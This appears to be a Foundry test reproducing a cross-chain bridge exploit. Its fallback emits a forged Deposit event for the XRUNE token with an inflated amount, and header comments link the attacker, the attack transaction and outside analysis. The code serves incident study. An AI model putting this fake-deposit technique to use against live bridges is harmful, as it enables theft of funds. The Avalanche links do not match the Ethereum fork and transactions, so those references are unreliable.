// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../interface.sol";
import "src/defisec/Log.sol";

// @KeyInfo
// Attacker : https://avascan.info/blockchain/c/address/0xeff003d64046a6f521ba31f39405cb720e953958
// Attack Contract : https://avascan.info/blockchain/c/address/0x67afdd6489d40a01dae65f709367e1b1d18a5322
// Vulnerable Contract : https://avascan.info/blockchain/c/address/0xbcd6796177ab8071f6a9ba2c3e2e0301ee91bef5
// Attack Tx : https://avascan.info/blockchain/c/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430

// @Info
// Vulnerable Contract Code : https://avascan.info/blockchain/c/address/0xbcd6796177ab8071f6a9ba2c3e2e0301ee91bef5/contract

// @Analysis
// Twitter Guy :https://twitter.com/peckshield/status/1626367531480125440
// https://explorer.phalcon.xyz/tx/eth/0x8cef95c68e2d2dc4c26f67a701cdc582bd1b234ea5128be40b3aa40605f83e17
// https://explorer.phalcon.xyz/tx/eth/0xce958939ba23771d0a0b80532c463b4cbbb175f4d14c08d9d27dd251f68a5da1

/*
    跨链桥合约需要被桥调用来触发。
*/
contract ContractTest is Test{

    event Deposit(address indexed to, address indexed asset, uint amount, string memo);

    function setUp() public {
        vm.createSelectFork('mainnet', 12878653 - 1);
    }

    fallback() external payable {
        address vaultAddress = address(0xf56cba49337a624e94042e325ad6bc864436e370);
        address XRUNEAddress = address(0x69fa0fee221ad11012bab0fdb45d444d3d2ce71c);
        uint safeAmount = 20_867_082_192_584_947_929_101_400;
        string memory memo = "10% VAR bounty would have prevented this";
        emit Deposit(vaultAddress, XRUNEAddress, safeAmount, memo);
    }

}






















